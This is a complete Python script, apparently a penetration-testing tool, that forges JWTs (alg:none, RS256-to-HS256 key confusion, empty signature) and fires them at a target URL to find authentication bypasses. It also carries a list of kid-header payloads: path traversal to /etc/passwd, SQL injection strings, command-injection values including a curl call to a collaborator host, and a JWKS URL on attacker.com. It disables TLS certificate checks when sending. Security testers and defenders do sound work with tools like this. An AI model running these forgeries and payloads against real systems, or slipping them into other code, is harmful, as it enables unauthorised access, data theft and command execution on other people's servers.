#!/usr/bin/env python3
"""JWT Attack Matrix -- automated JWT vulnerability testing."""
import argparse, base64, hmac, hashlib, json, os, sys, time, urllib.parse

def b64url_decode(s):
    pad = (4 - len(s) % 4) % 4
    return base64.urlsafe_b64decode(s + pad * "=")

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

def decode_jwt(token):
    parts = token.split(".")
    if len(parts) < 2:
        return None, None
    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        return header, payload
    except Exception:
        return None, None

def forge_jwt(header_dict, payload_dict, signature=""):
    h = b64url_encode(json.dumps(header_dict, separators=(",", ":")))
    p = b64url_encode(json.dumps(payload_dict, separators=(",", ":")))
    return f"{h}.{p}.{signature}"

def test_alg_none(token, original_header):
    """Test alg:none attack."""
    header_none = dict(original_header)
    header_none["alg"] = "none"
    return forge_jwt(header_none, json.loads(b64url_decode(token.split(".")[1])))

def test_hmac_with_rsa_key(token, original_header, original_payload, rsa_public_key_pem):
    """Test RS256→HS256 confusion using RSA public key as HMAC secret."""
    header_hs = dict(original_header)
    header_hs["alg"] = "HS256"
    h = b64url_encode(json.dumps(header_hs, separators=(",", ":")))
    p = b64url_encode(json.dumps(original_payload, separators=(",", ":")))
    sig_input = f"{h}.{p}".encode()
    sig = hmac.new(rsa_public_key_pem.encode(), sig_input, hashlib.sha256).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"

def test_empty_signature(token):
    """Test empty signature bypass."""
    parts = token.split(".")
    return f"{parts[0]}.{parts[1]}."

def test_kid_injection(token, original_header, original_payload, kid_payload_map):
    """Test kid injection attacks (path traversal, SQLi, command injection)."""
    tokens = []
    for name, kid_value in kid_payload_map.items():
        header = dict(original_header)
        header["kid"] = kid_value
        h = b64url_encode(json.dumps(header, separators=(",", ":")))
        p = b64url_encode(json.dumps(original_payload, separators=(",", ":")))
        sig = token.split(".")[2] if len(token.split(".")) > 2 else ""
        tokens.append((name, f"{h}.{p}.{sig}"))
    return tokens

KID_PAYLOADS = {
    "kid_path_traversal_1": "../../../../etc/passwd",
    "kid_path_traversal_2": "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "kid_path_traversal_3": "/dev/null",
    "kid_path_traversal_4": "../../../../dev/null",
    "kid_sqli_1": "xxxx' UNION SELECT 'admin'--",
    "kid_sqli_2": "xxxx' OR 1=1--",
    "kid_sqli_3": "key1\";SELECT * FROM users;--",
    "kid_rce_1": "key1\" || id || \"",
    "kid_rce_2": "/dev/null; curl https://burpcollaborator.example.com",
    "kid_rce_3": "key1|id",
    "kid_jwks_spoof": "https://attacker.com/jwks.json",
}

def test_token(token, target_url, cookies, headers, proxy, timeout, dry_run, rsa_public_key=""):
    findings = []
    parts = token.split(".")
    if len(parts) < 2:
        return [{"timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                  "test": "decode", "status": "error", "evidence": "Invalid JWT format"}]

    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
    except Exception as e:
        return [{"timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                  "test": "decode", "status": "error", "evidence": f"Decode failed: {e}"}]

    ts = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())

    base_entry = {
        "timestamp": ts,
        "original_alg": header.get("alg"),
        "original_kid": header.get("kid"),
    }

    def send_request(test_token, test_name):
        entry = dict(base_entry)
        entry["test"] = test_name
        entry["forged_token"] = test_token[:100] + ("..." if len(test_token) > 100 else "")
        if dry_run:
            entry["status"] = "dry_run"
            entry["response_status"] = None
            entry["vulnerable"] = False
            entry["evidence"] = "dry-run: no request sent"
            return entry

        try:
            import urllib.request
            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            if not target_url:
                entry["status"] = "forge_only"
                entry["vulnerable"] = None
                entry["evidence"] = "No target URL provided; token forged only"
                return entry

            req = urllib.request.Request(target_url, method="GET")
            req.add_header("Authorization", f"Bearer {test_token}")
            for k, v in (headers or {}).items():
                req.add_header(k, v)
            if cookies:
                req.add_header("Cookie", "; ".join(f"{k}={v}" for k, v in cookies.items()))

            opener = urllib.request.build_opener()
            if proxy:
                proxy_handler = urllib.request.ProxyHandler({"https": proxy, "http": proxy})
                opener = urllib.request.build_opener(proxy_handler)

            resp = opener.open(req, timeout=timeout)
            entry["status"] = "sent"
            entry["response_status"] = resp.getcode()
            resp_body = resp.read().decode(errors="replace")[:2048]
            entry["response_body"] = resp_body
            entry["vulnerable"] = resp.getcode() in (200, 201, 202, 204, 301, 302)
            entry["evidence"] = f"Response {resp.getcode()}; body: {resp_body[:200]}"
        except urllib.error.HTTPError as e:
            entry["status"] = "http_error"
            entry["response_status"] = e.code
            entry["vulnerable"] = False
            entry["evidence"] = f"HTTP {e.code}: {e.reason}"
        except Exception as e:
            entry["status"] = "error"
            entry["response_status"] = None
            entry["vulnerable"] = False
            entry["evidence"] = f"Request error: {e}"
        return entry

    findings.append(send_request(forge_jwt(header, payload, parts[2] if len(parts) > 2 else ""), "decode_original"))

    alg_none_token = test_alg_none(token, header)
    findings.append(send_request(alg_none_token, "alg_none"))

    if rsa_public_key:
        hs256_token = test_hmac_with_rsa_key(token, header, payload, rsa_public_key)
        findings.append(send_request(hs256_token, "rs256_to_hs256_confusion"))

    findings.append(send_request(test_empty_signature(token), "empty_signature"))

    kid_tokens = test_kid_injection(token, header, payload, KID_PAYLOADS)
    for kid_name, kid_token in kid_tokens:
        findings.append(send_request(kid_token, f"kid_injection_{kid_name}"))

    return findings

def main():
    parser = argparse.ArgumentParser(description="JWT Attack Matrix")
    parser.add_argument("--token", required=True, help="JWT token to test")
    parser.add_argument("--target-url", default="", help="Target URL to test forged JWT against (optional)")
    parser.add_argument("--rsa-public-key", default="", help="RSA public key file or PEM string for RS256→HS256 confusion")
    parser.add_argument("--cookie", default="", help="Session cookies (key=value; key2=value2)")
    parser.add_argument("--header", action="append", default=[], help="Extra headers (Name:Value), repeatable")
    parser.add_argument("--proxy", default="", help="Proxy URL (http://127.0.0.1:8080)")
    parser.add_argument("--timeout", type=int, default=15, help="Request timeout in seconds")
    parser.add_argument("--context", default="", help="Target context / scope description")
    parser.add_argument("--dry-run", action="store_true", help="Print tests without sending requests")
    parser.add_argument("--output", default="jwt_attack_findings.jsonl", help="JSONL output file")
    args = parser.parse_args()

    rsa_key = ""
    if args.rsa_public_key:
        if os.path.isfile(args.rsa_public_key):
            with open(args.rsa_public_key) as f:
                rsa_key = f.read()
        else:
            rsa_key = args.rsa_public_key
            print("[!] Treating --rsa-public-key as inline PEM string", file=sys.stderr)

    cookies = {}
    if args.cookie:
        for pair in args.cookie.split(";"):
            pair = pair.strip()
            if "=" in pair:
                k, v = pair.split("=", 1)
                cookies[k.strip()] = v.strip()

    headers = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            headers[k.strip()] = v.strip()

    parts = args.token.split(".")
    if len(parts) < 2:
        print("[!] Invalid JWT token format", file=sys.stderr)
        sys.exit(1)

    header, payload = decode_jwt(args.token)
    if not header:
        print("[!] Could not decode JWT header/payload", file=sys.stderr)
        sys.exit(1)

    print(f"[*] JWT Attack Matrix", file=sys.stderr)
    print(f"[*] Algorithm: {header.get('alg', 'unknown')}", file=sys.stderr)
    print(f"[*] KID: {header.get('kid', 'not set')}", file=sys.stderr)
    print(f"[*] Header: {json.dumps(header)}", file=sys.stderr)
    print(f"[*] Payload: {json.dumps(payload)}", file=sys.stderr)
    if args.target_url:
        print(f"[*] Target URL: {args.target_url}", file=sys.stderr)
    else:
        print(f"[*] No target URL provided -- tokens will be forged but not sent", file=sys.stderr)
    if args.context:
        print(f"[*] Context: {args.context}", file=sys.stderr)
    if args.dry_run:
        print(f"[*] DRY RUN -- no requests will be sent", file=sys.stderr)
    print(f"[*] Output: {args.output}", file=sys.stderr)

    findings = test_token(
        args.token, args.target_url, cookies, headers,
        args.proxy, args.timeout, args.dry_run, rsa_key,
    )

    total = len(findings)
    vulnerable = sum(1 for f in findings if f.get("vulnerable"))

    with open(args.output, "w") as outfile:
        for i, entry in enumerate(findings):
            entry["index"] = i
            outfile.write(json.dumps(entry) + "\n")
            status = "[VULN]" if entry.get("vulnerable") else ""
            print(f"    [{i+1}/{total}] {entry['test']:35s} {status}", file=sys.stderr)

    print(f"\n[*] {vulnerable}/{total} tests indicated vulnerability", file=sys.stderr)
    print(f"[*] Findings written to {args.output}", file=sys.stderr)

    sys.exit(1 if vulnerable > 0 else 0)

if __name__ == "__main__":
    main()